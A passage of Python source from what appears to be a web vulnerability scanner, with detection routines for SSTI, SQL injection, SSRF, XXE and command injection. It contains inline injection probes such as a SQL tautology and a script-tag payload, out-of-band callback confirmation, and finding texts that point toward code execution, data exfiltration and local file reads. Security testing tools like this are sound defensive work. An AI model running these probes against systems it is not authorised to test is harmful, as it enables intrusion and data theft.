                    log(f"  [worker] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                q.task_done()

        ts = [threading.Thread(target=worker, daemon=True) for _ in range(self.threads)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        return results

    def _prepare_scan(self) -> None:
        if self._prepared:
            return
        self._prepared = True
        self._detect_waf()
        self._fingerprint_baselines()
        self._fingerprint_tech()
        self._log_tech_fingerprints()

    def _detect_waf(self) -> None:
        target = self.config.get("target", "")
        if not target:
            return
        if self.config.get("stealth"):
            log("[*] WAF detection skipped in stealth mode", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            self.waf_detected = True
            return
        log("[*] WAF probe: testing root URL with 2 detection payloads", Colors.CYAN, verbose_only=True, verbose=self.verbose)
        safe_url = target.rstrip("/") + "/"
        blocked = 0
        for probe in ("' OR 1=1--", "<script>alert(1)</script>"):
            try:
                r = safe_get(self.session, safe_url + "?" + urlencode({"q": probe}),
                             self.timeout, raise_for_status=False)
                if r and r.status_code in (403, 406, 429):
                    blocked += 1
            except Exception:
                continue
        if blocked >= 2:
            self.waf_detected = True
            log("[!] WAF detected", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

    def _fingerprint_baselines(self) -> None:
        for url in self.recon.get("urls", []):
            try:
                self.baselines.fingerprint(url)
            except Exception:
                continue

    def _fingerprint_tech(self) -> None:
        for url in self.recon.get("urls", []):
            try:
                self.tech_fingerprinter.fingerprint(url)
            except Exception:
                continue
        self.config["technology"] = self.tech_fingerprinter.all()

    def _log_tech_fingerprints(self) -> None:
        summary = self.tech_fingerprinter.summary()
        if summary and summary != "Unknown":
            log(f"  [Tech] {summary}", Colors.CYAN, verbose_only=True, verbose=self.verbose)

    def _get_target_scheme(self):
        return urlparse(self.config.get("target", "")).scheme.lower()

    def _same_origin(self, action_url: str) -> bool:
        target = urlparse(self.config.get("target", ""))
        action = urlparse(action_url)
        return action.netloc == "" or action.netloc == target.netloc

    # ═════════════════════════════════════════════════════════════════════
    # SSTI — 4-Stage Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_ssti(self, target_urls: list[str] | None = None) -> list[dict]:
        """
        4-stage SSTI detection:
        Stage 1: Detect reflection of template syntax.
        Stage 2: Fingerprint engine with engine-specific payloads.
        Stage 3: Verify evaluation occurred (arithmetic result).
        Stage 4: Attempt safe read-only proof.
        """
        findings: list[dict] = []
        urls = self._urls_with_params() if target_urls is None else target_urls

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    resp = safe_get(self.session, url, self.timeout)
                    result = self._ssti_test_parameter(url, param,
                        request_str=_build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "")
                    if result:
                        findings.append(result)
            except Exception as e:
                log(f"  [SSTI] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        for f in findings:
            self._add(f)
        return findings

    def _ssti_test_parameter(self, url: str, param: str,
                             request_str: str = "", response_excerpt_str: str = "") -> Optional[dict]:
        ssti_payloads = self._load_payloads("ssti")
        # Stage 1: Arithmetic reflection detection
        arithmetic_results = []
        for payload in ssti_payloads.get("arithmetic", SSTI_PAYLOADS.get("arithmetic", [])):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            body = resp.text

            # Check for arithmetic result (7*7 → 49)
            arithmetic_expected = payload.replace("7*7", "49").replace("7+7", "14").replace("7-7", "0")
            arithmetic_possible = any(e in body for e in ["49", "14", "0"])
            raw_payload_absent = payload not in body
            if arithmetic_possible and raw_payload_absent:
                arithmetic_results.append(("arithmetic", f"{payload} → evaluated", test_url, body))
            elif payload in body:
                arithmetic_results.append(("reflection", payload, test_url, body))

        if not arithmetic_results:
            return None

        has_arithmetic = any(r[0] == "arithmetic" for r in arithmetic_results)
        # Override response_excerpt with the arithmetic triggering response (not baseline)
        if has_arithmetic:
            for r in arithmetic_results:
                if r[0] == "arithmetic":
                    response_excerpt_str = r[3][:500]
                    break

        # Stage 2: Engine fingerprinting
        engine_sigs = []
        for engine, payload, expected in ssti_payloads.get("engine_fingerprint", SSTI_PAYLOADS.get("engine_fingerprint", [])):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if resp and expected and expected in resp.text:
                engine_sigs.append(engine)
            elif resp and payload in resp.text:
                engine_sigs.append(f"reflected_{engine}")

        # Stage 3: Verify evaluation (match engine patterns against engine_fingerprint responses)
        verified_engine = None
        engine_bodies = []
        for engine_name, fp_payload, expected in ssti_payloads.get("engine_fingerprint", SSTI_PAYLOADS.get("engine_fingerprint", [])):
            test_url = self._inject_param(url, param, fp_payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if resp:
                engine_bodies.append((engine_name, resp.text))
        for engine, pattern_list in SSTI_ENGINE_PATTERNS.items():
            for pattern in pattern_list:
                for eng_name, body in engine_bodies:
                    if pattern.search(body):
                        verified_engine = engine
                        break
                if verified_engine:
                    break
            if verified_engine:
                break

        # Stage 4: Read-proof attempt (safe, non-destructive)
        read_proof = []
        if verified_engine or has_arithmetic:
            for payload in ssti_payloads.get("read_proof", SSTI_PAYLOADS.get("read_proof", [])):
                test_url = self._inject_param(url, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if resp and len(resp.text) > 500 and payload not in resp.text:
                    read_proof.append(payload)

        # Determine confidence tier
        if verified_engine and read_proof:
            title = "Confirmed SSTI"
            severity = "critical"
            evidence = f"Engine: {verified_engine}, Arithmetic: true, Read-proof: {' '.join(read_proof[:2])}"
            stage = VerificationStage.EXPLOITABLE.value
            vsteps = [
                f"Stage 1: Arithmetic reflection detected",
                f"Stage 2: Engine fingerprinted as {verified_engine}",
                f"Stage 3: Engine-specific evaluation verified",
                f"Stage 4: Read-proof payloads produced output",
            ]
        elif verified_engine or has_arithmetic:
            title = "Likely SSTI"
            severity = "high"
            evidence = f"Arithmetic: {has_arithmetic}, Engine sigs: {', '.join(engine_sigs[:3])}"
            stage = VerificationStage.VALIDATED.value
            vsteps = [
                f"Stage 1: Arithmetic reflection detected",
                f"Stage 2: Engine signals: {', '.join(engine_sigs[:3])}",
                f"Stage 3: Evaluation suspected",
            ]
        else:
            title = "Potential SSTI"
            severity = "medium"
            evidence = f"Payloads reflected: {', '.join(r[1][:40] for r in arithmetic_results[:2])}"
            stage = VerificationStage.DETECTED.value
            vsteps = [
                f"Stage 1: Template syntax reflected in response",
            ]

        return finding(
            vuln_type=title,
            url=list(set(r[2] for r in arithmetic_results))[0],
            severity=severity,
            details=f"Parameter '{param}': {title.lower()} detected",
            evidence=evidence,
            request=request_str or _build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
            response_excerpt=response_excerpt_str,
            verification_stage=stage,
            parameter=param,
            validation_steps=vsteps,
        )

    # ═════════════════════════════════════════════════════════════════════
    # SQLi — Multi-Signal Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_sqli(self, target_urls: list[str] | None = None) -> list[dict]:
        """
        Multi-signal SQLi detection:
        1. Error-based (must match SQL error strings)
        2. Boolean-based (AND 1=1 vs AND 1=2 response diffing)
        3. Time-based (requires >4.5s delay, repeatable)
        4. OOB (requires callback verification)
        Requires multiple signals before marking Confirmed.

        Args:
            target_urls: Optional list of specific URLs to scan. If None, uses all discovered URLs.
        """
        self._prepare_scan()
        payloads = self._load_payloads("sqli")
        oob_host = self.config.get("oob_host")
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                query = parse_qs(parsed.query, keep_blank_values=True)
                for param, values in query.items():
                    original_value = values[0] if values else "1"
                    signals, trigger_resp = self._sqli_test_parameter(url, param, original_value, payloads, oob_host)
                    if any(signals.values()):
                        f = self._sqli_build_finding(url, param, signals, original_value=original_value,
                            request_str=_build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                            response_excerpt_str=trigger_resp or "")
                        if f:
                            self._add(f)
            except Exception as e:
                log(f"  [SQLi] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # ── POST body SQLi (JSON, XML, form-encoded) ─────────────────
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                self._sqli_test_post_body(url, payloads, oob_host)
            except Exception as e:
                log(f"  [SQLi POST] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    def _sqli_test_parameter(self, url: str, param: str, original_value: str,
                              payloads: dict, oob_host: Optional[str]) -> tuple[dict, Optional[str]]:
        signals = {"error": False, "boolean": False, "time": False, "union": False, "oob": False}
        evidence_parts = []
        triggering_response: Optional[str] = None

        # ── Error-based (with baseline comparison) ────────────────────
        baseline_resp = safe_get(self.session, url, self.timeout)
        baseline_sql_errors: set[str] = set()
        if baseline_resp:
            lower_baseline = baseline_resp.text.lower()
            baseline_sql_errors = {err for err in SQLI_ERRORS if err in lower_baseline}
        for payload in payloads.get("error_based", []):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            lower_body = resp.text.lower()
            matched = [err for err in SQLI_ERRORS if err in lower_body and err not in baseline_sql_errors]
            if matched:
                signals["error"] = True
                evidence_parts.append(f"error:{matched[0]}")
                triggering_response = resp.text[:500]
                break

        # ── Boolean-based ────────────────────────────────────────────
        boolean_pairs = payloads.get("boolean_based", [])
        if boolean_pairs:
            baseline = safe_get(self.session, url, self.timeout)
            if baseline:
                baseline_hash = hashlib.md5(baseline.text.encode()).hexdigest()
                baseline_len = len(baseline.text)
                for true_cond, false_cond in boolean_pairs:
                    true_url = self._inject_param(url, param, f"{original_value} {true_cond}")
                    false_url = self._inject_param(url, param, f"{original_value} {false_cond}")
                    true_resp = safe_get(self.session, true_url, self.timeout)
                    false_resp = safe_get(self.session, false_url, self.timeout)
                    if not (true_resp and false_resp):
                        continue
                    true_hash = hashlib.md5(true_resp.text.encode()).hexdigest()
                    false_hash = hashlib.md5(false_resp.text.encode()).hexdigest()
                    true_len = len(true_resp.text)
                    false_len = len(false_resp.text)
                    true_normal = baseline_hash == true_hash
                    false_diff = baseline_hash != false_hash
                    if true_normal and false_diff:
                        signals["boolean"] = True
                        evidence_parts.append("boolean:AND 1=1 vs AND 1=2 diff")
                        triggering_response = false_resp.text[:500]
                        break

        # ── Time-based (baseline comparison) ─────────────────────────
        baseline_start = time.time()
        safe_get(self.session, url, 15, raise_for_status=False)
        baseline_delay = time.time() - baseline_start
        for payload in payloads.get("time_based", []):
            test_url = self._inject_param(url, param, payload)
            delays = []
            time_resp = None
            for _ in range(2):
                start = time.time()
                time_resp = safe_get(self.session, test_url, 15, raise_for_status=False)
                delays.append(time.time() - start)
            min_delay = min(delays)
            if min_delay > baseline_delay + 4 and all(d > baseline_delay + 3 for d in delays):
                signals["time"] = True
                evidence_parts.append(f"time:delays={delays}, baseline={baseline_delay:.2f}s")
                if time_resp:
                    triggering_response = time_resp.text[:500]
                break

        # ── UNION-based (column counting via ORDER BY + UNION SELECT NULL) ──
        for payload in payloads.get("union", []):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            if "union" in evidence_parts:
                continue
            lower = resp.text.lower()
            # ORDER BY N success = no error. ORDER BY N failure = error.
            if "order by" in payload.lower():
                if not any(err in lower for err in SQLI_ERRORS):
                    # ORDER BY succeeded at this column count — good sign
                    evidence_parts.append(f"union:order_by_ok:{payload}")
                    signals["union"] = True
                    triggering_response = resp.text[:500]
                    continue
            # UNION SELECT NULL... success = different content than normal
            if "union select" in payload.lower() and "null" in payload.lower():
                if not any(err in lower for err in SQLI_ERRORS):
                    # UNION succeeded — column count matches
                    evidence_parts.append(f"union:matching_columns:{payload}")
                    signals["union"] = True
                    triggering_response = resp.text[:500]
                    break

        # ── OOB ──────────────────────────────────────────────────────
        if oob_host:
            for payload in payloads.get("oob", []):
                formatted = payload.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
                test_url = self._inject_param(url, param, formatted)
                safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                self.oob.register_interaction("sqli", formatted, test_url)
                # Delay then poll for callback — OOB provides strongest evidence
                time.sleep(1)
                callbacks = self.oob.poll()
                if callbacks:
                    signals["oob"] = True
                    evidence_parts.append(f"oob:callback received from {oob_host}")
                else:
                    evidence_parts.append(f"oob:sent to {oob_host} (no callback yet)")
                break

        return signals, triggering_response

    def _sqli_build_finding(self, url: str, param: str, signals: dict,
                            original_value: str = "1",
                            request_str: str = "", response_excerpt_str: str = "") -> Optional[dict]:
        signal_count = sum(1 for v in signals.values() if v)
        evidence_parts = []
        for k, v in signals.items():
            if v:
                evidence_parts.append(k)

        # OOB confirmed is the strongest signal — critical regardless of other signals
        if signals.get("oob"):
            title = "Confirmed SQL Injection (OOB)"
            severity = "critical"
            stage = VerificationStage.VERIFIED.value
        elif signal_count >= 3:
            title = "SQL Injection"
            severity = "critical"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 2:
            title = "Likely SQL Injection"
            severity = "high"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 1:
            title = "Potential SQL Injection"
            severity = "medium"
            stage = VerificationStage.DETECTED.value
        else:
            return None

        f = finding(
            vuln_type=title,
            url=url,
            severity=severity,
            details=f"Parameter '{param}': {signal_count} signal(s) detected ({', '.join(evidence_parts)})",
            evidence=" | ".join(evidence_parts),
            request=request_str or _build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
            response_excerpt=response_excerpt_str,
            verification_stage=stage,
            parameter=param,
            validation_steps=[f"Signal: {s}" for s in evidence_parts],
        )
        if f:
            f["original_value"] = original_value
        return f

    def _sqli_test_post_body(self, url: str, payloads: dict, oob_host: Optional[str]) -> None:
        """Test POST endpoints with SQLi payloads in JSON, XML, and form bodies."""
        post_payloads = POST_SQLI_PAYLOADS

        # Baseline: neutral POST to capture pre-existing SQL error noise
        baseline_errors: set[str] = set()
        try:
            baseline_resp = safe_post(self.session, url, data=json.dumps({"id": "1"}), headers={"Content-Type": "application/json"}, timeout=self.timeout)
            if baseline_resp:
                baseline_errors = {e for e in SQLI_ERRORS if e in baseline_resp.text.lower()}
        except Exception:
            pass

        headers = {"Content-Type": "application/json"}
        for payload in post_payloads["json"]:
            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
            if resp:
                new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                if new_errors:
                    signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                    f = self._sqli_build_finding(url, "POST JSON body", signals,
                        request_str=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "")
                    if f:
                        self._add(f)
                break

        headers = {"Content-Type": "application/xml"}
        for payload in post_payloads["xml"]:
            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
            if resp:
                new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                if new_errors:
                    signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                    f = self._sqli_build_finding(url, "POST XML body", signals,
                        request_str=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "")
                    if f:
                        self._add(f)
                break

        # Try form fields from recon first, then fall back to hardcoded
        form_fields: list[str] = []
        for form in (self.recon.get("forms", []) or []):
            form_action = form.get("action", "")
            if form_action and (form_action in url or url in form_action):
                for field in form.get("fields", []):
                    ftype = field.get("type", "").lower()
                    fname = field.get("name", "")
                    if fname and ftype in ("text", "search", "email", "number", ""):
                        form_fields.append(fname)
        if not form_fields:
            form_fields = ["id", "query", "search", "email", "filter", "name"]
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        for payload in post_payloads["form"]:
            for field_name in form_fields:
                post_data = {field_name: payload}
                resp = safe_post(self.session, url, data=post_data, headers=headers, timeout=self.timeout)
                if resp:
                    new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                    if new_errors:
                        signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                        f = self._sqli_build_finding(url, f"POST form body ({field_name})", signals,
                        request_str=_build_curl("POST", url, dict(self.session.headers), data=post_data, cookies=dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "")
                        if f:
                            self._add(f)
                        break
            else:
                continue
            break

        # OOB variants for POST bodies
        if oob_host:
            oob_payloads = payloads.get("oob", [])
            for oob_p in oob_payloads:
                formatted = oob_p.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
                resp = safe_post(self.session, url, data=json.dumps({"id": formatted}),
                                 headers={"Content-Type": "application/json"}, timeout=self.timeout)
                if resp:
                    time.sleep(1)
                    if self.oob.poll():
                        signals = {"error": False, "boolean": False, "time": False, "union": False, "oob": True}
                        f = self._sqli_build_finding(url, "POST JSON body (OOB)", signals,
                            request_str=_build_curl("POST", url, dict(self.session.headers), data=json.dumps({"id": formatted}), cookies=dict(self.session.cookies)),
                            response_excerpt_str=resp.text[:500] if resp else "")
                        if f:
                            self._add(f)
                        break

    # ═════════════════════════════════════════════════════════════════════
    # Second-Order Injection Tracking
    # ═════════════════════════════════════════════════════════════════════

    def _record_second_order(self, url: str, param: str, payload: str) -> None:
        """Record a submitted payload that may be stored (second-order)."""
        key = url.split("?")[0]
        self._second_order_store.setdefault(key, []).append({
            "param": param,
            "payload": payload,
            "submitted_at": time.time(),
        })

    def _check_second_order(self) -> None:
        """Re-request pages to find delayed reflections of stored payloads."""
        delay = 3  # seconds to wait before checking
        time.sleep(delay + 1)
        for base_url, entries in list(self._second_order_store.items()):
            if not self._in_scope(base_url):
                continue
            resp = safe_get(self.session, base_url, self.timeout)
            if not resp:
                continue
            for entry in entries:
                payload = entry["payload"]
                if payload in resp.text and payload not in self.recon.get("body", ""):
                    f = finding(
                        vuln_type="Second-Order Injection",
                        url=base_url,
                        severity="high",
                        details=f"Stored payload reflected in {base_url}",
                        evidence=f"Payload: {payload} | Submitted via param: {entry['param']}",
                        request=_build_curl("GET", base_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        parameter=entry['param'],
                        steps_to_reproduce=[f"Send request to {base_url}", f"Observe payload reflection: {payload[:80]}"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=[f"Payload '{payload}' submitted via {entry['param']} then reflected on {base_url}"],
                    )
                    if f:
                        self._add(f)
                    break

    # ═════════════════════════════════════════════════════════════════════
    # SSRF — OOB-Only Confirmation
    # ═════════════════════════════════════════════════════════════════════

    def _calculate_ssrf_confidence(self, matched: list[str], baseline_diff: bool,
                                    json_detected: bool, credentials_found: bool) -> int:
        """Evidence-based confidence scoring for SSRF findings."""
        score = 0
        if matched:
            score += 10
        if baseline_diff:
            score += 20
        if json_detected:
            score += 30
        if credentials_found:
            score += 40
        return min(score, 100)

    def scan_ssrf(self, target_urls: list[str] | None = None) -> list[dict]:
        """
        SSRF detection with OOB-only confirmation.
        Groups all vulnerable parameters per endpoint into a single finding.

        Args:
            target_urls: Optional list of specific URLs to scan. If None, uses all discovered URLs.
        """
        oob_host = self.config.get("oob_host")
        findings: list[dict] = []
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                original_params = parse_qs(parsed.query)
                params = list(dict.fromkeys(list(original_params.keys()) + SSRF_PARAM_NAMES))

                baseline_resp = safe_get(self.session, url, self.timeout)
                baseline_hash = hashlib.md5(baseline_resp.text.encode()).hexdigest() if baseline_resp else None
                baseline_len = len(baseline_resp.text) if baseline_resp else 0

                ssrf_payloads = self._load_payloads("ssrf")
                vulnerable_params: list[str] = []
                all_matched_sigs: set[str] = set()
                all_test_urls: list[str] = []
                json_detected = False
                credentials_found = False

                for param in params:
                    for payload in ssrf_payloads:
                        test_url = self._build_ssrf_url(url, parsed, original_params, param, payload)
                        resp = safe_get(self.session, test_url, self.timeout)
                        if not resp:
                            continue

                        # Check cloud metadata signatures
                        body = resp.text
                        matched = [sig for sig in SSRF_SIGNATURES if sig in body]
                        if matched and len(matched) >= 2:
                            vulnerable_params.append(param)
                            all_matched_sigs.update(matched)
                            all_test_urls.append(test_url)
                            # Detect actual JSON metadata structure
                            if body.strip().startswith("{"):
                                json_detected = True
                            # Detect credentials in metadata
                            if "secret" in body.lower() or "token" in body.lower() or "password" in body.lower():
                                credentials_found = True

                        # OOB callback
                        if oob_host:
                            oob_url = self._build_ssrf_url(url, parsed, original_params, param,
                                                           f"http://{self.oob.callback_token}.{oob_host}/ssrf")
                            safe_get(self.session, oob_url, self.timeout, raise_for_status=False)
                            self.oob.register_interaction("ssrf", oob_url, test_url)

                if vulnerable_params:
                    resp_hash = hashlib.md5(resp.text.encode()).hexdigest()
                    baseline_diff = baseline_hash is not None and resp_hash != baseline_hash
                    confidence_score = self._calculate_ssrf_confidence(
                        list(all_matched_sigs), baseline_diff, json_detected, credentials_found,
                    )
                    if confidence_score < 40:
                        log(f"  [SSRF] Skipped {url} (confidence {confidence_score}% < 40%)",
                            Colors.WHITE, verbose_only=True, verbose=self.verbose)
                        continue
                    f = finding(
                        vuln_type="Confirmed SSRF",
                        url=url,
                        severity="critical",
                        details=f"Vulnerable parameters ({len(vulnerable_params)}): {', '.join(vulnerable_params[:10])}",
                        evidence=f"Signatures: {', '.join(list(all_matched_sigs)[:5])}",
                        request=_build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        steps_to_reproduce=[f"Send request to {url}", f"Observe cloud metadata signature in response"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=[f"Cloud metadata signature matched: {s}" for s in all_matched_sigs],
                        confidence_score=confidence_score,
                    )
                    if f and self._add(f):
                        findings.append(f)

            except Exception as e:
                log(f"  [SSRF] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # Poll OOB for callbacks
        confirmed_oob = self.oob.poll()
        for entry in confirmed_oob:
            oob_url = entry.get("url", "")
            f = finding(
                vuln_type="Confirmed SSRF (OOB)",
                url=oob_url,
                severity="critical",
                details=f"OOB callback received for SSRF probe — DNS/HTTP interaction confirmed from target server",
                evidence=f"Callback: {entry.get('payload', '')} | Confirmed: DNS/HTTP callback received",
                request=_build_curl("GET", oob_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                verification_stage=VerificationStage.VERIFIED.value,
                validation_steps=["OOB callback verified: DNS/HTTP interaction confirmed from target infrastructure"],
                response_excerpt="(SSRF confirmed via out-of-band callback — DNS/HTTP request received from target server)",
                steps_to_reproduce=[
                    f"Send SSRF probe to {oob_url}",
                    "Observe OOB callback on listener — confirms server makes external requests",
                    "Use SSRF to access internal services or cloud metadata",
                ],
            )
            if f and self._add(f):
                findings.append(f)

        return findings

    def _build_ssrf_url(self, url: str, parsed, original_params: dict, param: str, payload: str) -> str:
        if param in original_params:
            return self._inject_param(url, param, payload)
        separator = "&" if parsed.query else "?"
        return f"{url}{separator}{urlencode({param: payload})}"

    # ═════════════════════════════════════════════════════════════════════
    # XXE — In-Band + OOB Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_xxe(self, target_urls: list[str] | None = None) -> list[dict]:
        """
        XML External Entity (XXE) detection.

        In-Band: Submit XML with entity that reads /etc/passwd, check for file contents.
        OOB:     Submit XML that triggers callback to OOB host.
        Error:   Submit malformed XML that leaks file contents via error messages.

        Args:
            target_urls: Optional list of specific URLs to scan. If None, uses all discovered URLs.
        """
        findings: list[dict] = []
        oob_host = self.config.get("oob_host")
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        for url in urls:
            if not self._in_scope(url):
                continue
            signals = {"in_band": False, "error": False, "oob": False}
            evidence_parts = []

            xml_headers = {"Content-Type": "application/xml"}

            xxe_payloads = self._load_payloads("xxe")
            # In-Band: file read via entity
            for payload in xxe_payloads.get("in_band", XXE_PAYLOADS.get("in_band", [])):
                try:
                    resp = safe_post(self.session, url, payload,
                                     self.timeout, headers=xml_headers)
                    if not resp:
                        continue
                    body = resp.text
                    for sig in XXE_SIGNATURES:
                        if sig in body:
                            signals["in_band"] = True
                            evidence_parts.append(f"in_band:{sig}")
                            f = finding(
                                vuln_type="XML External Entity (XXE) Injection",
                                url=url, severity="critical",
                                details="In-band XXE: file content returned in response via XML entity",
                                evidence=f"Signature: {sig!r}",
                                request=_build_curl("POST", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                                response_excerpt=resp.text[:500],
                                steps_to_reproduce=[f"Send POST request to {url} with XXE payload", f"Observe: {sig}"],
                                verification_stage=VerificationStage.VALIDATED.value,
                                validation_steps=[f"In-band XXE payload returned file content: {sig}"],
                            )
                            if f and self._add(f):
                                findings.append(f)
                            log(f"  [XXE] In-band {url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                            break
                    if signals["in_band"]:
                        break
                except Exception:
                    continue

            # Error-based: file read via error message
            if not signals["in_band"]:
                for payload in xxe_payloads.get("error_based", XXE_PAYLOADS.get("error_based", [])):
                    try:
                        resp = safe_post(self.session, url, payload,
                                         self.timeout, headers=xml_headers)
                        if not resp:
                            continue
                        body = resp.text
                        for sig in XXE_SIGNATURES:
                            if sig in body:
                                signals["error"] = True
                                evidence_parts.append(f"error:{sig}")
                                f = finding(
                                    vuln_type="XML External Entity (XXE) Injection",
                                    url=url, severity="critical",
                                    details="Error-based XXE: file content leaked via parser error message",
                                    evidence=f"Signature: {sig!r}",
                                    request=_build_curl("POST", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                                    response_excerpt=resp.text[:500],
                                    steps_to_reproduce=[f"Send POST request to {url} with XXE payload", f"Observe: {sig}"],
                                    verification_stage=VerificationStage.VALIDATED.value,
                                    validation_steps=["Error-based XXE payload leaked file content"],
                                )
                                if f and self._add(f):
                                    findings.append(f)
                                log(f"  [XXE Error] {url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                break
                        if signals["error"]:
                            break
                    except Exception:
                        continue

            # OOB-based blind XXE
            if oob_host and not signals["in_band"] and not signals["error"]:
                for payload in xxe_payloads.get("oob", XXE_PAYLOADS.get("oob", [])):
                    try:
                        formatted = payload.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
                        safe_post(self.session, url, formatted,
                                  self.timeout, headers=xml_headers, raise_for_status=False)
                        self.oob.register_interaction("xxe", formatted, url)
                        evidence_parts.append(f"oob:sent to {oob_host}")
                        signals["oob"] = True
                    except Exception:
                        continue

        # Poll OOB for callbacks
        confirmed_oob = self.oob.poll()
        for entry in confirmed_oob:
            oob_url = entry.get("url", "")
            f = finding(
                vuln_type="XML External Entity (XXE) Injection",
                url=oob_url,
                severity="critical",
                details="Blind XXE confirmed via OOB callback — server parsed XML entity and made external request",
                evidence=f"Callback: {entry.get('payload', '')[:200]}",
                request=_build_curl("POST", oob_url, dict(self.session.headers), data="(XXE payload with OOB DTD)", cookies=dict(self.session.cookies)),
                verification_stage=VerificationStage.VERIFIED.value,
                validation_steps=["OOB callback verified: DNS/HTTP interaction from XML parser"],
                response_excerpt="(XXE confirmed via out-of-band callback — XML parser made external request)",
                steps_to_reproduce=[
                    f"Send XXE payload to {oob_url}",
                    "Observe OOB callback — confirms XML external entity processing",
                    "Use XXE to read local files or access internal services",
                ],
            )
            if f and self._add(f):
                findings.append(f)
            log(f"  [XXE OOB] {entry.get('url', '')}", Colors.RED, verbose_only=True, verbose=self.verbose)

        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Command Injection — Output + Time-Based + OOB Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_command_injection(self, target_urls: list[str] | None = None) -> list[dict]:
        """
        Command injection detection with multi-signal confirmation.

        Output-based: Inject OS commands and check for command output in response.
        Time-based:   Inject sleep/ping payloads and measure response delay.
        OOB:          Inject commands that trigger DNS/HTTP callbacks.

        Args:
            target_urls: Optional list of specific URLs to scan. If None, uses all discovered URLs.
        """
        oob_host = self.config.get("oob_host")
        findings: list[dict] = []
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    signals, trigger_resp = self._cmd_injection_test_parameter(url, param, oob_host)
                    if signals and any(signals.values()):
                        f = self._cmd_injection_build_finding(url, param, signals,
                            request_str=_build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                            response_excerpt_str=trigger_resp or "")
                        if f and self._add(f):
                            findings.append(f)
            except Exception as e:
                log(f"  [CMD] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # Poll OOB for callbacks
        confirmed_oob = self.oob.poll()
        for entry in confirmed_oob:
            oob_url = entry.get("url", "")
            f = finding(
                vuln_type="Command Injection",
                url=oob_url,
                severity="critical",
                details="Command injection confirmed via OOB callback — injected command executed on server",
                evidence=f"Callback: {entry.get('payload', '')[:200]}",
                request=_build_curl("GET", oob_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                verification_stage=VerificationStage.VERIFIED.value,
                validation_steps=["OOB callback verified: DNS/HTTP interaction from injected command"],
                response_excerpt="(Command injection confirmed via out-of-band callback — server executed injected command)",
                steps_to_reproduce=[
                    f"Send command injection payload to {oob_url}",
                    "Observe OOB callback — confirms command execution on server",
                    "Use access for remote code execution or data exfiltration",
                ],
            )
            if f and self._add(f):
                findings.append(f)
